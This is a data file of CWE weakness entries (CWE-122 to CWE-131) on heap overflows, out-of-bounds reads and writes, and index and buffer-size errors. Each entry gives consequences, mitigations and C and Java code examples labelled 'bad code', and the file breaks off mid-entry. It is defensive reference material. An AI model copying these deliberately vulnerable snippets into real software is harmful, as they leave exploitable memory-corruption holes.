CWE-122: Heap-based Buffer Overflow,"A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Modify MemoryBuffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. Besides important user data, heap-based overflows can be used to overwrite function pointers that may be living in memory, pointing it to the attacker's code. Even in applications that do not explicitly use function pointers, the run-time will usually leave many in memory. For example, object methods in C++ are generally implemented using function pointers. Even in C programs, there is often a global offset table used by the underlying runtime., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism; OtherWhen the consequence is arbitrary code execution, this can often be used to subvert any other security service., Likelihood: ","Example 1While buffer overflow examples can be rather complex, it is possible to have very simple, yet still exploitable, heap-based buffer overflows:(bad code)Example Language:C#define BUFSIZE 256int main(int argc, char **argv) {char *buf;buf = (char *)malloc(sizeof(char)*BUFSIZE);strcpy(buf, argv[1]);}The buffer is allocated heap memory with a fixed size, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow.Example 2This example applies an encoding procedure to an input string and stores it into a buffer.(bad code)Example Language:Cchar * copy_input(char *user_supplied_string){int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){/* encode to &lt; */}else dst_buf[dst_index++] = user_supplied_string[i];}return dst_buf;}The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.","Pre-design: Use a language or compiler that performs automatic bounds checking.Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Not a complete solution.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  ImplementationImplement and perform bounds checking on input.Phase:  ImplementationStrategy:  Libraries or FrameworksDo not use dangerous functions such as gets. Look for their safe equivalent, which checks for the boundary.Phase:  OperationUse OS-level preventative functionality. This is not a complete solution, but it provides some defense in depth."
CWE-123: Write-what-where Condition,"Any condition where the attacker has the ability to write an arbitrary value to an arbitrary location, often as the result of a buffer overflow.","Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; DoS: Crash, Exit, or Restart; Bypass Protection MechanismClearly, write-what-where conditions can be used to write data to areas of memory outside the scope of a policy. Also, they almost invariably can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator., Likelihood: ; Scope: IntegrityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Modify MemoryMany memory accesses can lead to program termination, such as when writing to addresses that are invalid for the current process., Likelihood: ; Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherWhen the consequence is arbitrary code execution, this can often be used to subvert any other security service., Likelihood:","Example 1The classic example of a write-what-where condition occurs when the accounting information for memory allocations is overwritten in a particular fashion. Here is an example of potentially vulnerable code:(bad code)Example Language:C#define BUFSIZE 256int main(int argc, char **argv) {char *buf1 = (char *) malloc(BUFSIZE);char *buf2 = (char *) malloc(BUFSIZE);strcpy(buf1, argv[1]);free(buf2);}Vulnerability in this case is dependent on memory layout. The call to strcpy() can be used to write past the end of buf1, and, with a typical layout, can overwrite the accounting information that the system keeps for buf2 when it is allocated. Note that if the allocation header for buf2 can be overwritten, buf2 itself can be overwritten as well.The allocation header will generally keep a linked list of memory ""chunks"". Particularly, there may be a ""previous"" chunk and a ""next"" chunk. Here, the previous chunk for buf2 will probably be buf1, and the next chunk may be null. When the free() occurs, most memory allocators will rewrite the linked list using data from buf2. Particularly, the ""next"" chunk for buf1 will be updated and the ""previous"" chunk for any subsequent chunk will be updated. The attacker can insert a memory address for the ""next"" chunk and a value to write into that memory address for the ""previous"" chunk.This could be used to overwrite a function pointer that gets dereferenced later, replacing it with a memory address that the attacker has legitimate access to, where they have placed malicious code, resulting in arbitrary code execution.",Phase:  Architecture and DesignStrategy:  Language SelectionUse a language that provides appropriate memory abstractions.Phase:  OperationUse OS-level preventative functionality integrated after the fact. Not a complete solution.
CWE-124: Buffer Underwrite ('Buffer Underflow'),The product writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.,"Scope: IntegrityAvailability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or RestartOut of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify Memory; Bypass Protection Mechanism; OtherIf the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy. The consequences would only be limited by how the affected data is used, such as an adjacent memory location that is used to specify whether the user has special privileges., Likelihood: ; Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherWhen the consequence is arbitrary code execution, this can often be used to subvert any other security service., Likelihood: ","Example 1In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.(bad code)Example Language:Cchar* trimTrailingWhitespace(char *strMessage, int length) {char *retMessage;char *message = malloc(sizeof(char)*(length+1));// copy input string to a temporary stringchar message[length+1];int index;for (index = 0; index < length; index++) {message[index] = strMessage[index];}message[index] = '\0';// trim trailing whitespaceint len = index-1;while (isspace(message[len])) {message[len] = '\0';len--;}// return string without trailing whitespaceretMessage = message;return retMessage;}However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.Example 2The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring ""Replace Me"" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf.  Using pointer arithmetic, the starting index of the substring is found.(bad code)Example Language:Cint main() {...char *result = strstr(destBuf, ""Replace Me"");int idx = result - destBuf;strcpy(&destBuf[idx], srcBuf);...}In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number.  If idx is negative, this will result in a buffer underwrite of destBuf.",Phase:  RequirementsChoose a language that is not susceptible to these issues.Phase:  ImplementationAll calculated values that are used as index or for pointer arithmetic should be validated to ensure that they are within an expected range.
CWE-125: Out-of-bounds Read,"The product reads data past the end, or before the beginning, of the intended buffer.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Bypass Protection MechanismBy reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service., Likelihood: ","Example 1In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method(bad code)Example Language:Cint getValueFromArray(int *array, int len, int index) {int value;// check that the array index is less than the maximum// length of the arrayif (index < len) {// get the value at the specified index of the arrayvalue = array[index];}// if array index is invalid then output error message// and return value indicating errorelse {printf(""Value is: %d\n"", array[index]);value = -1;}return value;}However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.(good code)Example Language:C...// check that the array index is within the correct// range of values for the arrayif (index >= 0 && index < len) {...","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.To reduce the likelihood of introducing an out-of-bounds read, ensure that you validate and ensure correct calculations for any length argument, buffer size calculation, or offset. Be especially careful of relying on a sentinel (i.e. special character such as NUL) in untrusted inputs.Phase:  Architecture and DesignStrategy:  Language SelectionUse a language that provides appropriate memory abstractions."
CWE-126: Buffer Over-read,The product reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations after the targeted buffer.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Bypass Protection MechanismBy reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service., Likelihood: ","Example 1In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing.(bad code)Example Language:Cint processMessageFromSocket(int socket) {int success;char buffer[BUFFER_SIZE];char message[MESSAGE_SIZE];// get message from socket and store into buffer//Ignoring possibliity that buffer > BUFFER_SIZEif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {// place contents of the buffer into message structureExMessage *msg = recastBuffer(buffer);// copy message body into string for processingint index;for (index = 0; index < msg->msgLength; index++) {message[index] = msg->msgBody[index];}message[index] = '\0';// process messagesuccess = processMessage(message);}return success;}However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130).Example 2The following C/C++ example demonstrates a buffer over-read due to a missing NULL terminator. The main method of a pattern matching utility that looks for a specific pattern within a specific file uses the string strncopy() method to copy the command line user input file name and pattern to the Filename and Pattern character arrays respectively.(bad code)Example Language:Cint main(int argc, char **argv){char Filename[256];char Pattern[32];/* Validate number of parameters and ensure valid content */.../* copy filename parameter to variable, may cause off-by-one overflow */strncpy(Filename, argv[1], sizeof(Filename));/* copy pattern parameter to variable, may cause off-by-one overflow */strncpy(Pattern, argv[2], sizeof(Pattern));printf(""Searching file: %s for the pattern: %s\n"", Filename, Pattern);Scan_File(Filename, Pattern);}However, the code do not take into account that strncpy() will not add a NULL terminator when the source buffer is equal in length of longer than that provide size attribute. Therefore if a user enters a filename or pattern that are the same size as (or larger than) their respective character arrays, a NULL terminator will not be added (CWE-170) which leads to the printf() read beyond the expected end of the Filename and Pattern buffers.To fix this problem, be sure to subtract 1 from the sizeof() call to allow room for the null byte to be added.(good code)Example Language:C/* copy filename parameter to variable, no off-by-one overflow */strncpy(Filename, argv[2], sizeof(Filename)-1);Filename[255]='\0';/* copy pattern parameter to variable, no off-by-one overflow */strncpy(Pattern, argv[3], sizeof(Pattern)-1);Pattern[31]='\0';",无可能的缓解方案
CWE-127: Buffer Under-read,The product reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations prior to the targeted buffer.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Bypass Protection MechanismBy reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service., Likelihood: ",无示范例子,无可能的缓解方案
CWE-128: Wrap-around Error,"Wrap around errors occur whenever a value is incremented past the maximum value for its type and therefore ""wraps around"" to a very small, negative, or undefined value.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: InstabilityThis weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur., Likelihood: ; Scope: ConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection MechanismThis weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy., Likelihood: ","Example 1The following image processing code allocates a table for images.(bad code)Example Language:Cimg_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).",Requirements specification: The choice could be made to use a language that is not susceptible to these issues.Phase:  Architecture and DesignProvide clear upper and lower bounds on the scale of any protocols designed.Phase:  ImplementationPerform validation on all incremented variables to ensure that they remain within reasonable bounds.
CWE-129: Improper Validation of Array Index,"The product uses untrusted input when calculating or using an array index, but the product does not validate or incorrectly validates the index to ensure the index references a valid position within the array.","Scope: IntegrityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or RestartUse of an index that is outside the bounds of an array will very likely result in the corruption of relevant memory and perhaps instructions, leading to a crash, if the values are outside of the valid memory area., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify MemoryIf the memory corrupted is data, rather than instructions, the system will continue to function with improper values., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Modify Memory; Read MemoryUse of an index that is outside the bounds of an array can also trigger out-of-bounds read or write operations, or operations on the wrong objects; i.e., ""buffer overflows"" are not always the result. This may result in the exposure or modification of sensitive data., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow and possibly without the use of large inputs if a precise index can be controlled., Likelihood: ; Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands; Read Memory; Modify MemoryA single fault could allow either an overflow (CWE-788) or underflow (CWE-786) of the array index. What happens next will depend on the type of operation being performed out of bounds, but can expose sensitive information, cause a system crash, or possibly lead to arbitrary code execution., Likelihood:","Example 1In the code snippet below, an untrusted integer value is used to reference an object in an array.(bad code)Example Language:Javapublic String getValue(int index) {return array[index];}If index is outside of the range of the array, this may result in an ArrayIndexOutOfBounds Exception being raised.Example 2The following example takes a user-supplied value to allocate an array of objects and then operates on the array.(bad code)Example Language:Javaprivate void buildList ( int untrustedListSize ){if ( 0 > untrustedListSize ){die(""Negative value supplied for list size, die evil hacker!"");}Widget[] list = new Widget [ untrustedListSize ];list[0] = new Widget();}This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.Example 3In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method(bad code)Example Language:Cint getValueFromArray(int *array, int len, int index) {int value;// check that the array index is less than the maximum// length of the arrayif (index < len) {// get the value at the specified index of the arrayvalue = array[index];}// if array index is invalid then output error message// and return value indicating errorelse {printf(""Value is: %d\n"", array[index]);value = -1;}return value;}However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.(good code)Example Language:C...// check that the array index is within the correct// range of values for the arrayif (index >= 0 && index < len) {...Example 4The following example retrieves the sizes of messages for a pop3 mail server. The message sizes are retrieved from a socket that returns in a buffer the message number and the message size, the message number (num) and size (size) are extracted from the buffer and the message size is placed into an array using the message number for the array index.(bad code)Example Language:C/* capture the sizes of all messages */int getsizes(int sock, int count, int *sizes) {...char buf[BUFFER_SIZE];int ok;int num, size;// read values from socket and added to sizes arraywhile ((ok = gen_recv(sock, buf, sizeof(buf))) == 0){// continue read from socket until buf only contains '.'if (DOTLINE(buf))break;else if (sscanf(buf, ""%d %d"", &num, &size) == 2)sizes[num - 1] = size;}...}In this example the message number retrieved from the buffer could be a value that is outside the allowable range of indices for the array and could possibly be a negative number. Without proper validation of the value to be used for the array index an array overflow could occur and could potentially lead to unauthorized access to memory addresses and system crashes. The value of the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code.(good code)Example Language:C/* capture the sizes of all messages */int getsizes(int sock, int count, int *sizes) {...char buf[BUFFER_SIZE];int ok;int num, size;// read values from socket and added to sizes arraywhile ((ok = gen_recv(sock, buf, sizeof(buf))) == 0){// continue read from socket until buf only contains '.'if (DOTLINE(buf))break;else if (sscanf(buf, ""%d %d"", &num, &size) == 2) {if (num > 0 && num <= (unsigned)count)sizes[num - 1] = size;else/* warn about possible attempt to induce buffer overflow */report(stderr, ""Warning: ignoring bogus data for message sizes returned by server.\n"");}}...}Example 5In the following example the method displayProductSummary is called from a Web service servlet to retrieve product summary information for display to the user. The servlet obtains the integer value of the product number from the user and passes it to the displayProductSummary method. The displayProductSummary method passes the integer value of the product number to the getProductSummary method which obtains the product summary from the array object containing the project summaries using the integer value of the product number as the array index.(bad code)Example Language:Java// Method called from servlet to obtain product informationpublic String displayProductSummary(int index) {String productSummary = new String("""");try {String productSummary = getProductSummary(index);} catch (Exception ex) {...}return productSummary;}public String getProductSummary(int index) {return products[index];}In this example the integer value used as the array index that is provided by the user may be outside the allowable range of indices for the array which may provide unexpected results or cause the application to fail. The integer value used for the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code.(good code)Example Language:Java// Method called from servlet to obtain product informationpublic String displayProductSummary(int index) {String productSummary = new String("""");try {String productSummary = getProductSummary(index);} catch (Exception ex) {...}return productSummary;}public String getProductSummary(int index) {String productSummary = """";if ((index >= 0) && (index < MAX_PRODUCTS)) {productSummary = products[index];}else {System.err.println(""index is out of bounds"");throw new IndexOutOfBoundsException();}return productSummary;}An alternative in Java would be to use one of the collection objects such as ArrayList that will automatically generate an exception if an attempt is made to access an array index that is out of bounds.(good code)Example Language:JavaArrayList productArray = new ArrayList(MAX_PRODUCTS);...try {productSummary = (String) productArray.get(index);} catch (IndexOutOfBoundsException ex) {...}Example 6The following example asks a user for an offset into an array to select an item.(bad code)Example Language:Cint main (int argc, char **argv) {char *items[] = {""boat"", ""car"", ""truck"", ""train""};int index = GetUntrustedOffset();printf(""You selected %s\n"", items[index-1]);}The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).","Phase:  Architecture and DesignStrategy:  Input ValidationUse an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, Ada allows the programmer to constrain the values of a variable and languages such as Java and Ruby will allow the programmer to handle exceptions when an out-of-bounds index is accessed.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When accessing a user-controlled array index, use a stringent range of values that are within the target array. Make sure that you do not allow negative values to be used. That is, verify the minimum as well as the maximum of the range of acceptable values.Phase:  ImplementationBe especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-130: Improper Handling of Length Parameter Inconsistency,"The product parses a formatted message or structure, but it does not handle or incorrectly handles a length field that is inconsistent with the actual length of the associated data.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify Memory; Varies by Context, Likelihood: ","Example 1In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing.(bad code)Example Language:Cint processMessageFromSocket(int socket) {int success;char buffer[BUFFER_SIZE];char message[MESSAGE_SIZE];// get message from socket and store into buffer//Ignoring possibliity that buffer > BUFFER_SIZEif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {// place contents of the buffer into message structureExMessage *msg = recastBuffer(buffer);// copy message body into string for processingint index;for (index = 0; index < msg->msgLength; index++) {message[index] = msg->msgBody[index];}message[index] = '\0';// process messagesuccess = processMessage(message);}return success;}However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130).","Phase:  ImplementationWhen processing structured incoming data containing a size field followed by raw data, ensure that you identify and resolve any inconsistencies between the size field and the actual size of the data.Phase:  ImplementationDo not let the user control the size of the buffer.Phase:  ImplementationValidate that the length of the user-supplied data is consistent with the buffer size."
CWE-131: Incorrect Calculation of Buffer Size,"The product does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands; Read Memory; Modify MemoryIf the incorrect calculation is used in the context of memory allocation, then the software may create a buffer that is smaller or larger than expected. If the allocated buffer is smaller than expected, this could lead to an out-of-bounds read or write (CWE-119), possibly causing a crash, allowing arbitrary code execution, or exposing sensitive data., Likelihood:","Example 1The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.(bad code)Example Language:Cint i;unsigned int numWidgets;Widget **WidgetList;numWidgets = GetUntrustedSizeValue();if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {ExitError(""Incorrect number of widgets requested!"");}WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));printf(""WidgetList ptr=%p\n"", WidgetList);for(i=0; i<numWidgets; i++) {WidgetList[i] = InitializeWidget();}WidgetList[numWidgets] = NULL;showWidgets(WidgetList);However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.Example 2The following image processing code allocates a table for images.(bad code)Example Language:Cimg_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).Example 3This example applies an encoding procedure to an input string and stores it into a buffer.(bad code)Example Language:Cchar * copy_input(char *user_supplied_string){int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = 